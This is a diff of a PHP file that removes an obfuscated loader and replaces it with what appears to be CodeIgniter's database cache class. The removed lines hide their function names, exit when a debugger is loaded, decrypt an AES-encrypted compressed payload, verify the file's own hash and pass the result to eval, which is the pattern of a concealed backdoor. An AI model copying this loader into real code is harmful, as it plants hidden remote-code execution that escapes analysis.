@@ -1,28 +1,191 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_v729wsag=('bas'.'e64'.'_de'.'cod'.'e');
-$_balrcti5=('gzu'.'nco'.'mpr'.'ess');
-$_lxj4opd1=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_fntcvs4r='vpRrxZvJ';
-$_q83kf8a3='omXH2Qo1pxo=';
-$_aktaf023='xtaHE3kc';
-$_tvjg6m5z='2T7WQI/h';
-$_i8n0z7cs='ZtgaoG4o';
-$_ez1ffhq3='fC0yZOPW';
-$_rkf6391u='uj/wgw==';
-$_t9evivjn='uvCypRAz';
-$_jx8j7nln=$_v729wsag($_fntcvs4r.$_tvjg6m5z.$_i8n0z7cs.$_aktaf023.$_q83kf8a3);
-$_trhwmqe7=$_v729wsag($_ez1ffhq3.$_t9evivjn.$_rkf6391u);
-$_jyo4fzzf=$_v729wsag('17VC4AzGpbiThqs9D8cjY9OhMoeX4asHRud8DYA7XNooKqmjvkpv2E2ZX3o4dEltgXp9h8aEOF90kmPFu9HbQ8BWCeOoVCcA0Nxlp5CKOnraayVB70L7SbJYbT36UzrXgPO+AbIT5mEmIwle5soNuao5vQNhnaVZK/ponxvbjHiOOw94X0dZmrsxuL0wy7FKEGYe8hGWYdufiaiDQe2Ooq2tHE7zp/BY66Y4hagRWPcyAyFaw7z9ogab5BgfASs0aWDXx79XqJ80v/9Tw7rbWjVpGCGadFzgIHCD0l30NHksih8uM690OE82XzW/wAhUfEtz8y34J/T/taVSxQG2rAvwQmrAoCLkfTsySWtsreHpNvblMvNvOpLFqP6qHPMzWNAgunlq/GEkfX+ZrlbXESCfu8hr/SG/NzHyNqFOBBC1UVDcKW+FxpbKk8aDgnhGomg0FFaIFpk+xFjQ5vrPE2giJLO94t1HOprEr1pzv7dBhkr8G9efHGKBmNXRIienFapbDXrk6fWXv2IqnQmR/Bd/w/JQAwOqY3kw/YcDsWUt0Fd3Ll9OO2d3mpYp8Z2kwc0jJ9EH67Wy03PehsmP7dfEdZvsLY+gNjI36Vn5BhiTXRUi5VTZqpv+iAMJcmzaXx8XT/II45uNohSoiQO5UVojMqOne/5WwRnvjaZUWuE06tDJS1oXBm/PoLhMfvfOkb0Yd4f39SLTlCVuLr/Oqh/Xad0mrxQPTfqibSxfMUW8o9a9o1bE5sxpOYWRypVcLGyVXFv6OTfCTRRsviEHhOFw2ita7dXdI/diS8gW89oLdSvNOE1E2OOM1DdgU9uq+xBWQYu8PJgXGbYyGdFggxvHtvX1jUnRAlLbd/mDkc57TujULCyAgdca+uumJI1rDv6hRmRrCjRqQsbhmoUXle01lAA3rG3UpFWHoq96WUs=');
-$_frx5ht8c=$_lxj4opd1($_jyo4fzzf,'aes-256-cbc',$_jx8j7nln,OPENSSL_RAW_DATA,$_trhwmqe7);
-if($_frx5ht8c===false){exit;}
-$_tcnhwcym=$_balrcti5($_frx5ht8c);
-if($_tcnhwcym===false){exit;}
-$_r0ls9f4b='b8ee227ce0dbadd07cfa7b742ba6764145159355c5625523d2c65684b292f836';
-$_eo6xkgmg=@file_get_contents(__FILE__);
-if($_eo6xkgmg!==false){
-$_zudt25sf=str_replace($_r0ls9f4b,"0000000000000000000000000000000000000000000000000000000000000000",$_eo6xkgmg);
-$_udypcwdv=hash("sha256",$_zudt25sf);
-if($_udypcwdv!==$_r0ls9f4b){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+class CI_DB_Cache {
+
+
+
+
+
+public $CI;
+
+
+
+
+
+
+
+
+public $db;
+
+
+
+
+
+
+
+public function __construct(&$db)
+{
+
+$this->CI =& get_instance();
+$this->db =& $db;
+$this->CI->load->helper('file');
+$this->check_path();
 }
-eval($_tcnhwcym);
+
+
+
+
+
+
+
+public function check_path($path = '')
+{
+if ($path === '')
+{
+if ($this->db->cachedir === '')
+{
+return $this->db->cache_off();
+}
+$path = $this->db->cachedir;
+}
+
+$path = realpath($path)
+? rtrim(realpath($path), DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR
+: rtrim($path, '/').'/';
+if ( ! is_dir($path))
+{
+log_message('debug', 'DB cache path error: '.$path);
+
+return $this->db->cache_off();
+}
+if ( ! is_really_writable($path))
+{
+log_message('debug', 'DB cache dir not writable: '.$path);
+
+return $this->db->cache_off();
+}
+$this->db->cachedir = $path;
+return TRUE;
+}
+
+
+
+
+
+
+
+
+
+
+public function read($sql)
+{
+$segment_one = ($this->CI->uri->segment(1) == FALSE) ? 'default' : $this->CI->uri->segment(1);
+$segment_two = ($this->CI->uri->segment(2) == FALSE) ? 'index' : $this->CI->uri->segment(2);
+$filepath = $this->db->cachedir.$segment_one.'+'.$segment_two.'/'.md5($sql);
+if ( ! is_file($filepath) OR FALSE === ($cachedata = file_get_contents($filepath)))
+{
+return FALSE;
+}
+return unserialize($cachedata);
+}
+
+
+
+
+
+
+
+
+public function write($sql, $object)
+{
+$segment_one = ($this->CI->uri->segment(1) == FALSE) ? 'default' : $this->CI->uri->segment(1);
+$segment_two = ($this->CI->uri->segment(2) == FALSE) ? 'index' : $this->CI->uri->segment(2);
+$dir_path = $this->db->cachedir.$segment_one.'+'.$segment_two.'/';
+$filename = md5($sql);
+if ( ! is_dir($dir_path) && ! @mkdir($dir_path, 0750))
+{
+return FALSE;
+}
+if (write_file($dir_path.$filename, serialize($object)) === FALSE)
+{
+return FALSE;
+}
+chmod($dir_path.$filename, 0640);
+return TRUE;
+}
+
+
+
+
+
+
+
+
+public function delete($segment_one = '', $segment_two = '')
+{
+if ($segment_one === '')
+{
+$segment_one = ($this->CI->uri->segment(1) == FALSE) ? 'default' : $this->CI->uri->segment(1);
+}
+if ($segment_two === '')
+{
+$segment_two = ($this->CI->uri->segment(2) == FALSE) ? 'index' : $this->CI->uri->segment(2);
+}
+$dir_path = $this->db->cachedir.$segment_one.'+'.$segment_two.'/';
+delete_files($dir_path, TRUE);
+}
+
+
+
+
+
+
+public function delete_all()
+{
+delete_files($this->db->cachedir, TRUE, TRUE);
+}
+}
